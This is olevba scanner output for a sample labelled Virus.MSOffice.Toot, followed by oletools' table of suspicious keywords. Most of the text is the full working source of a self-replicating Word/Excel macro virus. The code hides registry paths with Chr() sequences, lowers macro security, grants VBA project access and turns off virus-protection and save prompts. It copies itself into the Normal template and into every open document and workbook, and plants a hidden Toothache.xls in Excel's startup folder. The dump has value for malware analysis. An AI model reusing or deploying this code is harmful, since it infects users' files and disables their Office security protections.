olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSOffice.Toot
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSOffice.Toot - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private _
Sub _
Workbook_Deactivate()
On _
Error _
Resume _
Next
With _
ThisWorkbook
With _
.VBProject
With _
.vbcomponents("ThisWorkBook")
With _
.CodeModule
Code _
= _
.Lines(1, _
.countoflines)
End _
With
End _
With
End _
With
End _
With
Set _
wrd _
= _
GetObject(, _
"Word.Application")
wason _
= _
1
If _
wrd _
= _
"" _
Then
Set _
wrd _
= _
CreateObject("Word.Application")
wason _
= _
0
End _
If
With _
wrd
With _
.System
.PrivateProfileString("", _
Chr(72) _
& _
Chr(75) _
& _
Chr(69) _
& _
Chr(89) _
& _
Chr(95) & Chr(67) & Chr(85) & Chr(82) & Chr(82) & Chr(69) & Chr(78) & Chr(84) & Chr(95) & Chr(85) & Chr(83) & Chr(69) & Chr(82) & Chr(92) & Chr(83) & Chr(111) & Chr(102) & Chr(116) & Chr(119) & Chr(97) & Chr(114) & Chr(101) & Chr(92) & Chr(77) & Chr(105) & Chr(99) & Chr(114) & Chr(111) & Chr(115) & Chr(111) & Chr(102) & Chr(116) & Chr(92) & Chr(79) & Chr(102) & Chr(102) & Chr(105) & Chr(99) & Chr(101) & Chr(92) & Chr(56) & Chr(46) & Chr(48) & Chr(92) & Chr(69) & Chr(120) & Chr(99) & Chr(101) & Chr(108) & Chr(92) & Chr(77) & Chr(105) & Chr(99) & Chr(114) & Chr(111) & Chr(115) & Chr(111) & Chr(102) & Chr(116) & Chr(32) & Chr(69) & Chr(120) & Chr(99) & Chr(101) & Chr(108), Chr(79) & Chr(112) & Chr(116) & Chr(105) & Chr(111) & Chr(110) & Chr(115) & Chr(54)) = &H0
.PrivateProfileString("", _
Chr(72) _
& _
Chr(75) _
& _
Chr(69) _
& _
Chr(89) _
& _
Chr(95) & Chr(67) & Chr(85) & Chr(82) & Chr(82) & Chr(69) & Chr(78) & Chr(84) & Chr(95) & Chr(85) & Chr(83) & Chr(69) & Chr(82) & Chr(92) & Chr(83) & Chr(111) & Chr(102) & Chr(116) & Chr(119) & Chr(97) & Chr(114) & Chr(101) & Chr(92) & Chr(77) & Chr(105) & Chr(99) & Chr(114) & Chr(111) & Chr(115) & Chr(111) & Chr(102) & Chr(116) & Chr(92) & Chr(79) & Chr(102) & Chr(102) & Chr(105) & Chr(99) & Chr(101) & Chr(92) & Chr(57) & Chr(46) & Chr(48) & Chr(92) & Chr(87) & Chr(111) & Chr(114) & Chr(100) & Chr(92) & Chr(83) & Chr(101) & Chr(99) & Chr(117) & Chr(114) & Chr(105) & Chr(116) & Chr(121), Chr(76) & Chr(101) & Chr(118) & Chr(101) & Chr(108)) = 1&
.PrivateProfileString("", _
Chr(72) _
& _
Chr(75) _
& _
Chr(69) _
& _
Chr(89) _
& _
Chr(95) & Chr(67) & Chr(85) & Chr(82) & Chr(82) & Chr(69) & Chr(78) & Chr(84) & Chr(95) & Chr(85) & Chr(83) & Chr(69) & Chr(82) & Chr(92) & Chr(83) & Chr(111) & Chr(102) & Chr(116) & Chr(119) & Chr(97) & Chr(114) & Chr(101) & Chr(92) & Chr(77) & Chr(105) & Chr(99) & Chr(114) & Chr(111) & Chr(115) & Chr(111) & Chr(102) & Chr(116) & Chr(92) & Chr(79) & Chr(102) & Chr(102) & Chr(105) & Chr(99) & Chr(101) & Chr(92) & Chr(49) & Chr(48) & Chr(46) & Chr(48) & Chr(92) & Chr(87) & Chr(111) & Chr(114) & Chr(100) & Chr(92) & Chr(83) & Chr(101) & Chr(99) & Chr(117) & Chr(114) & Chr(105) & Chr(116) & Chr(121), Chr(76) & Chr(101) & Chr(118) & Chr(101) & Chr(108)) = 1&
If _
.PrivateProfileString("", _
Chr(72) _
& _
Chr(75) _
& _
Chr(69) _
& _
Chr(89) _
& Chr(95) & Chr(67) & Chr(85) & Chr(82) & Chr(82) & Chr(69) & Chr(78) & Chr(84) & Chr(95) & Chr(85) & Chr(83) & Chr(69) & Chr(82) & Chr(92) & Chr(83) & Chr(111) & Chr(102) & Chr(116) & Chr(119) & Chr(97) & Chr(114) & Chr(101) & Chr(92) & Chr(77) & Chr(105) & Chr(99) & Chr(114) & Chr(111) & Chr(115) & Chr(111) & Chr(102) & Chr(116) & Chr(92) & Chr(79) & Chr(102) & Chr(102) & Chr(105) & Chr(99) & Chr(101) & Chr(92) & Chr(49) & Chr(48) & Chr(46) & Chr(48) & Chr(92) & Chr(87) & Chr(111) & Chr(114) & Chr(100) & Chr(92) & Chr(83) & Chr(101) & Chr(99) & Chr(117) & Chr(114) & Chr(105) & Chr(116) & Chr(121), Chr(65) & Chr(99) & Chr(99) & Chr(101) & Chr(115) & Chr(115) & Chr(86) & Chr(66) & Chr(79) & Chr(77)) <> 1& Then
.PrivateProfileString("", _
Chr(72) _
& _
Chr(75) _
& _
Chr(69) _
& _
Chr(89) _
& _
Chr(95) & Chr(67) & Chr(85) & Chr(82) & Chr(82) & Chr(69) & Chr(78) & Chr(84) & Chr(95) & Chr(85) & Chr(83) & Chr(69) & Chr(82) & Chr(92) & Chr(83) & Chr(111) & Chr(102) & Chr(116) & Chr(119) & Chr(97) & Chr(114) & Chr(101) & Chr(92) & Chr(77) & Chr(105) & Chr(99) & Chr(114) & Chr(111) & Chr(115) & Chr(111) & Chr(102) & Chr(116) & Chr(92) & Chr(79) & Chr(102) & Chr(102) & Chr(105) & Chr(99) & Chr(101) & Chr(92) & Chr(49) & Chr(48) & Chr(46) & Chr(48) & Chr(92) & Chr(87) & Chr(111) & Chr(114) & Chr(100) & Chr(92) & Chr(83) & Chr(101) & Chr(99) & Chr(117) & Chr(114) & Chr(105) & Chr(116) & Chr(121), Chr(65) & Chr(99) & Chr(99) & Chr(101) & Chr(115) & Chr(115) & Chr(86) & Chr(66) & Chr(79) & Chr(77)) = 1&
End _
If
End _
With
With _
.Options
.VirusProtection _
= _
0
.SaveNormalPrompt _
= _
0
End _
With
With _
.Application
.DisplayAlerts _
= _
wdAlertsNone
End _
With
End _
With
With _
wrd
With _
.NormalTemplate
With _
.VBProject
With _
.vbcomponents("ThisDocument")
With _
.CodeModule
.deletelines _
1, _
.countoflines
.addfromstring _
Code
End _
With
End _
With
End _
With
End _
With
End _
With
For _
Each _
fly _
In _
wrd.Documents
With _
fly
With _
.VBProject
With _
.vbcomponents("ThisDocument")
With _
.CodeModule
.deletelines _
1, _
.countoflines
.addfromstring _
Code
End _
With
End _
With
End _
With
End _
With
Next
If _
wason _
= _
0 _
Then _
wrd.Quit
If _
Dir(Application.StartupPath _
& _
"\Toothache.xls") _
= _
"Toothache.xls" _
Then _
inst _
= _
1
If _
inst _
<> _
1 _
Then
With _
Workbooks
.Add.SaveAs _
FileName:=Application.StartupPath _
& _
"\Toothache.xls"
End _
With
With _
ActiveWorkbook
With _
.VBProject
With _
.vbcomponents("ThisWorkBook")
.deletelines _
1, _
.countoflines
.addfromstring _
Code
End _
With
End _
With
End _
With
With _
ActiveWindow
.Visible _
= _
0
End _
With
Workbooks("Toothache.xls").Save
ActiveWorkbook.Save
End _
If
For _
Each _
fly _
In _
Workbooks
With _
fly
With _
.VBProject
With _
.vbcomponents("ThisWorkBook")
With _
.CodeModule
.deletelines _
1, _
.countoflines
.addfromstring _
Code
End _
With
End _
With
End _
With
End _
With
Next
End _
Sub
Private _
Sub _
document_Close()
On _
Error _
Resume _
Next
With _
ThisDocument
With _
.VBProject
With _
.vbcomponents("ThisDocument")
With _
.CodeModule
Code _
= _
.Lines(1, _
.countoflines)
End _
With
End _
With
End _
With
End _
With
Set _
EXL _
= _
GetObject(, _
"Excel.Application")
wason _
= _
1
If _
EXL _
= _
"" _
Then
Set _
EXL _
= _
CreateObject("Excel.Application")
wason _
= _
0
End _
If
With _
EXL
With _
.Application
.DisplayAlerts _
= _
wdAlertsNone
End _
With
End _
With
If _
Dir(EXL.Application.StartupPath _
& _
"\Toothache.xls") _
= _
"Toothache.xls" _
Then _
inst _
= _
1
If _
inst _
<> _
1 _
Then
With _
EXL.Workbooks
.Add.SaveAs _
FileName:=EXL.Application.StartupPath _
& _
"\Toothache.xls"
End _
With
With _
ActiveWorkbook
With _
.VBProject
With _
.vbcomponents("ThisWorkBook")
.deletelines _
1, _
.countoflines
.addfromstring _
Code
End _
With
End _
With
End _
With
With _
EXL.ActiveWindow
.Visible _
= _
0
End _
With
EXL.Workbooks("Toothache.xls").Save
EXL.ActiveWorkbook.Save
End _
If
For _
Each _
fly _
In _
EXL.Workbooks
With _
fly
With _
.VBProject
With _
.vbcomponents("ThisWorkBook")
With _
.CodeModule
.deletelines _
1, _
.countoflines
.addfromstring _
Code
End _
With
End _
With
End _
With
End _
With
Next
If _
wason _
= _
0 _
Then _
EXL.Quit
With _
System
.PrivateProfileString("", _
Chr(72) _
& _
Chr(75) _
& _
Chr(69) _
& _
Chr(89) _
& _
Chr(95) & Chr(67) & Chr(85) & Chr(82) & Chr(82) & Chr(69) & Chr(78) & Chr(84) & Chr(95) & Chr(85) & Chr(83) & Chr(69) & Chr(82) & Chr(92) & Chr(83) & Chr(111) & Chr(102) & Chr(116) & Chr(119) & Chr(97) & Chr(114) & Chr(101) & Chr(92) & Chr(77) & Chr(105) & Chr(99) & Chr(114) & Chr(111) & Chr(115) & Chr(111) & Chr(102) & Chr(116) & Chr(92) & Chr(79) & Chr(102) & Chr(102) & Chr(105) & Chr(99) & Chr(101) & Chr(92) & Chr(56) & Chr(46) & Chr(48) & Chr(92) & Chr(69) & Chr(120) & Chr(99) & Chr(101) & Chr(108) & Chr(92) & Chr(77) & Chr(105) & Chr(99) & Chr(114) & Chr(111) & Chr(115) & Chr(111) & Chr(102) & Chr(116) & Chr(32) & Chr(69) & Chr(120) & Chr(99) & Chr(101) & Chr(108), Chr(79) & Chr(112) & Chr(116) & Chr(105) & Chr(111) & Chr(110) & Chr(115) & Chr(54)) = &H0
.PrivateProfileString("", _
Chr(72) _
& _
Chr(75) _
& _
Chr(69) _
& _
Chr(89) _
& _
Chr(95) & Chr(67) & Chr(85) & Chr(82) & Chr(82) & Chr(69) & Chr(78) & Chr(84) & Chr(95) & Chr(85) & Chr(83) & Chr(69) & Chr(82) & Chr(92) & Chr(83) & Chr(111) & Chr(102) & Chr(116) & Chr(119) & Chr(97) & Chr(114) & Chr(101) & Chr(92) & Chr(77) & Chr(105) & Chr(99) & Chr(114) & Chr(111) & Chr(115) & Chr(111) & Chr(102) & Chr(116) & Chr(92) & Chr(79) & Chr(102) & Chr(102) & Chr(105) & Chr(99) & Chr(101) & Chr(92) & Chr(57) & Chr(46) & Chr(48) & Chr(92) & Chr(87) & Chr(111) & Chr(114) & Chr(100) & Chr(92) & Chr(83) & Chr(101) & Chr(99) & Chr(117) & Chr(114) & Chr(105) & Chr(116) & Chr(121), Chr(76) & Chr(101) & Chr(118) & Chr(101) & Chr(108)) = 1&
.PrivateProfileString("", _
Chr(72) _
& _
Chr(75) _
& _
Chr(69) _
& _
Chr(89) _
& _
Chr(95) & Chr(67) & Chr(85) & Chr(82) & Chr(82) & Chr(69) & Chr(78) & Chr(84) & Chr(95) & Chr(85) & Chr(83) & Chr(69) & Chr(82) & Chr(92) & Chr(83) & Chr(111) & Chr(102) & Chr(116) & Chr(119) & Chr(97) & Chr(114) & Chr(101) & Chr(92) & Chr(77) & Chr(105) & Chr(99) & Chr(114) & Chr(111) & Chr(115) & Chr(111) & Chr(102) & Chr(116) & Chr(92) & Chr(79) & Chr(102) & Chr(102) & Chr(105) & Chr(99) & Chr(101) & Chr(92) & Chr(49) & Chr(48) & Chr(46) & Chr(48) & Chr(92) & Chr(87) & Chr(111) & Chr(114) & Chr(100) & Chr(92) & Chr(83) & Chr(101) & Chr(99) & Chr(117) & Chr(114) & Chr(105) & Chr(116) & Chr(121), Chr(76) & Chr(101) & Chr(118) & Chr(101) & Chr(108)) = 1&
If _
.PrivateProfileString("", _
Chr(72) _
& _
Chr(75) _
& _
Chr(69) _
& _
Chr(89) _
& Chr(95) & Chr(67) & Chr(85) & Chr(82) & Chr(82) & Chr(69) & Chr(78) & Chr(84) & Chr(95) & Chr(85) & Chr(83) & Chr(69) & Chr(82) & Chr(92) & Chr(83) & Chr(111) & Chr(102) & Chr(116) & Chr(119) & Chr(97) & Chr(114) & Chr(101) & Chr(92) & Chr(77) & Chr(105) & Chr(99) & Chr(114) & Chr(111) & Chr(115) & Chr(111) & Chr(102) & Chr(116) & Chr(92) & Chr(79) & Chr(102) & Chr(102) & Chr(105) & Chr(99) & Chr(101) & Chr(92) & Chr(49) & Chr(48) & Chr(46) & Chr(48) & Chr(92) & Chr(87) & Chr(111) & Chr(114) & Chr(100) & Chr(92) & Chr(83) & Chr(101) & Chr(99) & Chr(117) & Chr(114) & Chr(105) & Chr(116) & Chr(121), Chr(65) & Chr(99) & Chr(99) & Chr(101) & Chr(115) & Chr(115) & Chr(86) & Chr(66) & Chr(79) & Chr(77)) <> 1& Then
.PrivateProfileString("", _
Chr(72) _
& _
Chr(75) _
& _
Chr(69) _
& _
Chr(89) _
& _
Chr(95) & Chr(67) & Chr(85) & Chr(82) & Chr(82) & Chr(69) & Chr(78) & Chr(84) & Chr(95) & Chr(85) & Chr(83) & Chr(69) & Chr(82) & Chr(92) & Chr(83) & Chr(111) & Chr(102) & Chr(116) & Chr(119) & Chr(97) & Chr(114) & Chr(101) & Chr(92) & Chr(77) & Chr(105) & Chr(99) & Chr(114) & Chr(111) & Chr(115) & Chr(111) & Chr(102) & Chr(116) & Chr(92) & Chr(79) & Chr(102) & Chr(102) & Chr(105) & Chr(99) & Chr(101) & Chr(92) & Chr(49) & Chr(48) & Chr(46) & Chr(48) & Chr(92) & Chr(87) & Chr(111) & Chr(114) & Chr(100) & Chr(92) & Chr(83) & Chr(101) & Chr(99) & Chr(117) & Chr(114) & Chr(105) & Chr(116) & Chr(121), Chr(65) & Chr(99) & Chr(99) & Chr(101) & Chr(115) & Chr(115) & Chr(86) & Chr(66) & Chr(79) & Chr(77)) = 1&
End _
If
End _
With
With _
Options
.VirusProtection _
= _
0
With _
.Application
.DisplayAlerts _
= _
wdAlertsNone
End _
With
End _
With
For _
Each _
fly _
In _
Documents
With _
fly
With _
.VBProject
With _
.vbcomponents("ThisDocument")
With _
.CodeModule
.deletelines _
1, _
.countoflines
.addfromstring _
Code
End _
With
End _
With
End _
With
End _
With
Next
With _
NormalTemplate
With _
.VBProject
With _
.vbcomponents("ThisDocument")
With _
.CodeModule
.deletelines _
1, _
.countoflines
.addfromstring _
Code
End _
With
End _
With
End _
With
End _
With
End _
Sub



















+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_Close      |Runs when the Word document is closed        |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

